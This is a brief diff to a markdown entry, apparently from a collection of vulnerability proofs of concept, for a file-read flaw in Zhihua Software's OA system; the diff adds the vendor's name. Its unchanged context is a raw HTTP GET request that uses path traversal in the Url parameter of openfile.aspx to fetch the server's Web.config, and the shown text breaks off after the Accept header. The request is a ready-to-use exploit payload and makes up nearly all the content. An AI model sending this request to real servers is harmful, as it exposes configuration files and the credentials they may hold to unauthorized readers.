@@ -1,5 +1,6 @@
 # zhihua_openfile_fileread
 
+志华软件
 ```
 GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
